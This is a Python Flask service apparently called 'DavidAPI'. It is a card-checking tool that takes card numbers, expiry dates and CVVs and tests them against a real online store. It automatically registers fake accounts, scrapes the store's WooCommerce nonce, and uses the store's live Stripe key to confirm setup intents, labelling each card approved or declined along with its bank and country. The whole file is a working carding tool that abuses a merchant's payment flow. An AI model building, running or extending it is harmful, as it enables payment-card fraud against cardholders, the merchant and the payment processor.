import requests
import time
import re
import json
import random
import urllib3
import warnings
import os
from flask import Flask, request, jsonify
from flask_cors import CORS, cross_origin
from urllib3.exceptions import InsecureRequestWarning

# Disable all SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
warnings.filterwarnings("ignore", category=InsecureRequestWarning)
warnings.filterwarnings("ignore", category=DeprecationWarning)
warnings.filterwarnings("ignore", category=UserWarning)
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

app = Flask(__name__)

# PROPER CORS Configuration
CORS(app, resources={
    r"/*": {
        "origins": "*",
        "methods": ["GET", "POST", "OPTIONS"],
        "allow_headers": ["Content-Type", "Authorization"]
    }
})

# ===== ROUTES =====
@app.route('/')
def home():
    return jsonify({
        'message': 'DavidAPI is running!',
        'endpoint': 'Use /check?cc=card|mm|yy|cvv',
        'status': 'active'
    })

@app.route('/health')
def health():
    return jsonify({'status': 'API is running'})

@app.route('/check', methods=['GET', 'POST', 'OPTIONS'])
@cross_origin()
def check_card():
    global account_manager
    
    # Handle OPTIONS request for CORS preflight
    if request.method == 'OPTIONS':
        return jsonify({'status': 'ok'}), 200
    
    try:
        # Get card data from request
        card_input = ""
        
        if request.method == 'GET':
            card_input = request.args.get('cc', '')
        else:  # POST
            # Handle different content types
            if request.is_json:
                data = request.get_json()
                card_input = data.get('cc', '')
            else:
                card_input = request.form.get('cc', '')
        
        if not card_input:
            return jsonify({
                'error': 'No card data provided. Use ?cc=card_number|mm|yy|cvv format'
            }), 400
        
        # Parse card input
        parsed_card = parse_card_input(card_input)
        if not parsed_card:
            return jsonify({
                'error': 'Invalid card format. Supported formats: 5213331423599035|01|2030|954, 5213331423599035|01|30|954, 5213331423599035|01/30|954, 5213331423599035|01/2030|954'
            }), 400
        
        cc, mes, ano, cvv = parsed_card
        
        # Initialize account manager if not exists - WITH RETRY LOGIC
        if not account_manager:
            max_retries = 3
            for attempt in range(max_retries):
                account_manager = setup_account_and_nonce()
                if account_manager:
                    print(f"✅ Account manager initialized successfully on attempt {attempt + 1}")
                    break
                else:
                    print(f"⚠️ Failed to initialize account manager (attempt {attempt + 1})")
                    if attempt < max_retries - 1:
                        time.sleep(2)  # Wait before retry
        
        if not account_manager:
            return jsonify({
                'error': 'Failed to initialize payment gateway after multiple attempts'
            }), 500
        
        # Process the card
        result = process_card(account_manager, cc, mes, ano, cvv)
        
        # Format response
        response_text = f"{cc}|{mes}|{ano}|{cvv} --> {result}"
        
        return jsonify({
            'card': f"{cc}|{mes}|{ano}|{cvv}",
            'result': result,
            'full_response': response_text,
            'status': 'success'
        })
        
    except Exception as e:
        print(f"❌ Error in check_card: {str(e)}")
        return jsonify({
            'error': f'Internal server error: {str(e)}'
        }), 500

# ===== IMPROVED CORE FUNCTIONALITY =====

class AccountManager:
    def __init__(self):
        self.session = requests.Session()
        self.base_url = "https://lolaandveranda.com"
        self.setup_headers()
        self.nonce = None
        self.account_created = False
        
    def setup_headers(self):
        self.headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
        }
        self.session.headers.update(self.headers)
        self.session.verify = False
    
    def extract_register_nonce(self, html_content):
        patterns = [
            r'name="woocommerce-register-nonce" value="([a-f0-9]+)"',
            r'id="woocommerce-register-nonce" value="([a-f0-9]+)"',
            r'woocommerce-register-nonce" value="([a-f0-9]+)"'
        ]
        for pattern in patterns:
            match = re.search(pattern, html_content)
            if match:
                return match.group(1)
        return None
    
    def extract_wp_referer(self, html_content):
        pattern = r'name="_wp_http_referer" value="([^"]*)"'
        match = re.search(pattern, html_content)
        return match.group(1) if match else "/my-account/"
    
    def is_logged_in(self, html_content):
        patterns = [
            r'woocommerce-MyAccount-navigation',
            r'logout',
            r'my-account/edit-account',
            r'Dashboard</a>'
        ]
        return any(re.search(pattern, html_content, re.IGNORECASE) for pattern in patterns)
    
    def register_account(self, email, password):
        try:
            print(f"🔧 Attempting to register account: {email}")
            
            # Step 1: Get the registration page
            response = self.session.get(
                f"{self.base_url}/my-account/", 
                timeout=30, 
                verify=False
            )
            response.raise_for_status()
            
            # Extract nonce and referer
            nonce = self.extract_register_nonce(response.text)
            wp_referer = self.extract_wp_referer(response.text)
            
            print(f"🔧 Extracted nonce: {nonce}")
            
            if not nonce:
                print("❌ No nonce found in registration page")
                return False
            
            # Step 2: Register the account
            registration_data = {
                'email': email,
                'password': password,
                'woocommerce-register-nonce': nonce,
                '_wp_http_referer': wp_referer,
                'register': 'Register',
            }
            
            # Clean headers for registration
            reg_headers = self.headers.copy()
            reg_headers.update({
                'Content-Type': 'application/x-www-form-urlencoded',
                'Origin': self.base_url,
                'Referer': f'{self.base_url}/my-account/',
            })
            
            response = self.session.post(
                f"{self.base_url}/my-account/",
                data=registration_data,
                headers=reg_headers,
                timeout=30,
                verify=False,
                allow_redirects=True
            )
            response.raise_for_status()
            
            # Check if registration was successful
            if self.is_logged_in(response.text):
                print(f"✅ Successfully registered and logged in: {email}")
                self.account_created = True
                return True
            else:
                print("❌ Registration failed - not logged in")
                # Check for error messages
                if "Error:" in response.text or "invalid_email" in response.text:
                    error_match = re.search(r'<ul class="woocommerce-error"[^>]*>(.*?)</ul>', response.text, re.DOTALL)
                    if error_match:
                        print(f"❌ Registration error: {error_match.group(1)}")
                return False
                
        except Exception as e:
            print(f"❌ Registration exception: {str(e)}")
            return False

class NonceExtractor:
    def __init__(self, session):
        self.session = session
        
    def extract_nonce_multiple_methods(self, html_content):
        methods = [
            self._extract_via_direct_pattern,
            self._extract_via_stripe_params,
            self._extract_via_json_script,
            self._extract_via_fallback_pattern
        ]
        
        for method in methods:
            nonce = method(html_content)
            if nonce:
                return nonce
        return None
    
    def _extract_via_direct_pattern(self, html):
        pattern = r'"createAndConfirmSetupIntentNonce":"([a-f0-9]{10})"'
        match = re.search(pattern, html)
        return match.group(1) if match else None
    
    def _extract_via_stripe_params(self, html):
        pattern = r'var\s+wc_stripe_params\s*=\s*({[^}]+})'
        match = re.search(pattern, html)
        if match:
            try:
                json_str = match.group(1)
                json_str = re.sub(r',\s*}', '}', json_str)
                data = json.loads(json_str)
                return data.get('createAndConfirmSetupIntentNonce')
            except:
                pass
        return None
    
    def _extract_via_json_script(self, html):
        script_pattern = r'<script[^>]*>(.*?)</script>'
        scripts = re.findall(script_pattern, html, re.DOTALL)
        
        for script in scripts:
            if 'createAndConfirmSetupIntentNonce' in script:
                json_pattern = r'\{[^}]*(?:createAndConfirmSetupIntentNonce[^}]*)+[^}]*\}'
                json_matches = re.findall(json_pattern, script)
                for json_str in json_matches:
                    try:
                        clean_json = json_str.replace("'", '"')
                        data = json.loads(clean_json)
                        if 'createAndConfirmSetupIntentNonce' in data:
                            return data['createAndConfirmSetupIntentNonce']
                    except:
                        continue
        return None
    
    def _extract_via_fallback_pattern(self, html):
        patterns = [
            r'createAndConfirmSetupIntentNonce["\']?\s*:\s*["\']([a-f0-9]{10})["\']',
            r'createAndConfirmSetupIntentNonce\s*=\s*["\']([a-f0-9]{10})["\']',
        ]
        
        for pattern in patterns:
            match = re.search(pattern, html, re.IGNORECASE)
            if match:
                return match.group(1)
        return None
    
    def get_nonce(self, url="https://lolaandveranda.com/my-account/add-payment-method/"):
        try:
            print("🔧 Extracting setup intent nonce...")
            response = self.session.get(url, timeout=30, verify=False)
            response.raise_for_status()
            
            nonce = self.extract_nonce_multiple_methods(response.text)
            print(f"🔧 Extracted setup nonce: {nonce}")
            return nonce
                
        except Exception as e:
            print(f"❌ Error extracting nonce: {str(e)}")
            return None

def year_convert(ano):
    year_map = {str(i).zfill(2): f"20{i}" for i in range(15, 41)}
    return year_map.get(ano, f"20{ano}")

def digitt():
    forbid = {
        "0000", "9999",
        "1234", "2345", "3456", "4567", "5678", "6789",
        "9876", "8765", "7654", "6543", "5432", "4321"
    }
    while True:
        code = f"{random.randint(0, 9999):04d}"
        if len(set(code)) == 1:
            continue
        if code in forbid:
            continue
        return code

def get_bin_info(bin):
    bin = str(bin)[:6]
    
    headers = {
        'Accept': 'application/json',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
    }
    
    try:
        response = requests.get(f"https://lookup.binlist.net/{bin}", headers=headers, timeout=5, verify=False)
        if response.status_code != 200:
            return {
                'country': 'Unknown',
                'bank': 'Unknown'
            }
        
        data = response.json()
        
        return {
            'country': data.get('country', {}).get('name', 'Unknown'),
            'bank': data.get('bank', {}).get('name', 'Unknown')
        }
        
    except:
        return {
            'country': 'Unknown',
            'bank': 'Unknown'
        }

def categorize_response(response_text):
    response = response_text.lower()
    
    approved_keywords = ["approved", "succeeded", "successfully"]
    declined_keywords = ["declined", "invalid", "failed", "error", "incorrect"]
    
    if any(kw in response for kw in approved_keywords):
        return "APPROVED", "✅"
    elif any(kw in response for kw in declined_keywords):
        return "DECLINED", "❌"
    else:
        return "UNKNOWN", "❓"

def setup_account_and_nonce():
    try:
        print("🔄 Setting up account manager...")
        account_manager = AccountManager()
        
        # Generate more unique credentials
        random_id = random.randint(10000, 99999)
        email = f"user{random_id}@gmail.com"
        password = f"Pass{random_id}$123"
        
        print(f"🔄 Registering account: {email}")
        
        if account_manager.register_account(email, password):
            print("✅ Account registered successfully, extracting nonce...")
            nonce_extractor = NonceExtractor(account_manager.session)
            nonce = nonce_extractor.get_nonce()
            
            if nonce:
                account_manager.nonce = nonce
                print("✅ Account manager setup complete!")
                return account_manager
            else:
                print("❌ Failed to extract setup nonce")
        else:
            print("❌ Failed to register account")
    
    except Exception as e:
        print(f"❌ Exception in setup_account_and_nonce: {str(e)}")
    
    return None

def parse_card_input(card_input):
    """Parse various card input formats"""
    card_input = card_input.strip()
    
    # Handle | separated format
    if '|' in card_input:
        parts = card_input.split('|')
        if len(parts) == 4:
            cc, mes, ano, cvv = parts
        elif len(parts) == 3:
            # Handle format: cc|mm/yy|cvv
            cc, date_part, cvv = parts
            if '/' in date_part:
                date_parts = date_part.split('/')
                if len(date_parts) == 2:
                    mes, ano = date_parts
                else:
                    return None
            else:
                return None
        else:
            return None
    else:
        return None
    
    # Clean and validate
    cc = cc.strip().replace(" ", "")
    mes = mes.strip()
    ano = ano.strip()
    cvv = cvv.strip()
    
    # Handle year format (convert 2-digit to 4-digit)
    if len(ano) == 2:
        ano = year_convert(ano)
    
    # Handle month format (ensure 2 digits)
    if len(mes) == 1:
        mes = mes.zfill(2)
    
    # Basic validation
    if len(cc) < 15 or len(cc) > 19:
        return None
    if len(mes) != 2 or not mes.isdigit():
        return None
    if len(ano) != 4 or not ano.isdigit():
        return None
    if len(cvv) < 3 or len(cvv) > 4 or not cvv.isdigit():
        return None
    
    return cc, mes, ano, cvv

def process_card(account_manager, cc, mes, ano, cvv):
    print(f"🔧 Processing card: {cc}|{mes}|{ano}|{cvv}")
    
    try:
        # Get BIN info
        bin_info = get_bin_info(cc[:6])
        bank = bin_info['bank']
        country = bin_info['country']
        
        print(f"🔧 BIN Info: {bank} - {country}")
        
        # Step 1: Create payment method with Stripe
        stripe_headers = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        }

        stripe_data = {
            'type': 'card',
            'card[number]': cc,
            'card[cvc]': cvv,
            'card[exp_month]': mes,
            'card[exp_year]': ano[-2:],  # Use last 2 digits of year
            'billing_details[address][postal_code]': '10080',
            'billing_details[address][country]': 'US',
            'key': 'pk_live_51KvfxOAXdQYg3Kve5Dflq504Hy68DHhZfeB6eBPir5aY01s18bWHxpVRKRMRYy7kgoKkmCuNgmu7mDiL6WqIVsH7003wq0Cyi3'
        }
        
        print("🔧 Creating Stripe payment method...")
        response = requests.post(
            'https://api.stripe.com/v1/payment_methods', 
            headers=stripe_headers, 
            data=stripe_data,
            verify=False,
            timeout=30
        )
        
        print(f"🔧 Stripe response status: {response.status_code}")
        
        if response.status_code != 200:
            error_msg = f"Stripe API Error: {response.status_code}"
            try:
                error_data = response.json()
                if 'error' in error_data:
                    error_msg = f"Declined: {error_data['error'].get('message', 'Unknown error')}"
            except:
                pass
            return error_msg
        
        payment_data = response.json()
        
        if 'error' in payment_data:
            return f"Declined: {payment_data['error'].get('message', 'Unknown error')}"
        
        payment_method_id = payment_data.get("id")
        if not payment_method_id:
            return "Unknown: No payment method ID returned"
        
        print(f"🔧 Payment method created: {payment_method_id}")
        
        # Wait before next request
        time.sleep(2)
        
        # Step 2: Confirm setup intent
        setup_headers = {
            'authority': 'lolaandveranda.com',
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://lolaandveranda.com',
            'referer': 'https://lolaandveranda.com/my-account/add-payment-method/',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
        }

        setup_data = {
            'action': 'wc_stripe_create_and_confirm_setup_intent',
            'wc-stripe-payment-method': payment_method_id,
            'wc-stripe-payment-type': 'card',
            '_ajax_nonce': account_manager.nonce,
        }

        print("🔧 Confirming setup intent...")
        response = account_manager.session.post(
            'https://lolaandveranda.com/wp-admin/admin-ajax.php', 
            headers=setup_headers, 
            data=setup_data,
            verify=False,
            timeout=30
        )
        
        print(f"🔧 Setup intent response status: {response.status_code}")
        
        if response.status_code == 200:
            result = response.json()
            
            if result.get('success'):
                if result.get('data', {}).get('status') == 'succeeded':
                    status_msg = f"{digitt()} Approved: Card Authorized Successfully"
                    category, emoji = categorize_response(status_msg)
                    return f"{status_msg} - {category} {emoji} | {bank} - {country}"
                else:
                    error_data = result.get('data', {})
                    if 'error' in error_data:
                        error_msg = error_data['error'].get('message', 'Unknown success response')
                    else:
                        error_msg = 'Unknown success response'
                    category, emoji = categorize_response(error_msg)
                    return f"Unknown: {error_msg} - {category} {emoji} | {bank} - {country}"
            else:
                error_data = result.get('data', {})
                if 'error' in error_data:
                    error_msg = error_data['error'].get('message', 'Unknown error')
                else:
                    error_msg = result.get('data', 'Unknown error')
                category, emoji = categorize_response(error_msg)
                return f"Declined: {error_msg} - {category} {emoji} | {bank} - {country}"
        else:
            error_msg = f"HTTP Error: {response.status_code}"
            category, emoji = categorize_response(error_msg)
            return f"{error_msg} - {category} {emoji} | {bank} - {country}"
            
    except Exception as e:
        error_msg = f"Error: {str(e)}"
        category, emoji = categorize_response(error_msg)
        return f"{error_msg} - {category} {emoji} | {bank} - {country}"

# Global account manager instance
account_manager = None

if __name__ == '__main__':
    print("🚀 Starting DavidAPI...")
    
    # Initialize account manager on startup with retry
    max_startup_retries = 3
    for attempt in range(max_startup_retries):
        account_manager = setup_account_and_nonce()
        if account_manager:
            print("✅ Account manager initialized successfully on startup")
            break
        else:
            print(f"⚠️ Failed to initialize account manager on startup (attempt {attempt + 1})")
            if attempt < max_startup_retries - 1:
                time.sleep(3)
    
    if not account_manager:
        print("⚠️ Failed to initialize account manager on startup - will retry on first request")
    
    # Get port from environment variable (for Render)
    port = int(os.environ.get('PORT', 10000))
    print(f"🚀 Starting DavidAPI on port {port}")
    app.run(host='0.0.0.0', port=port, debug=False)
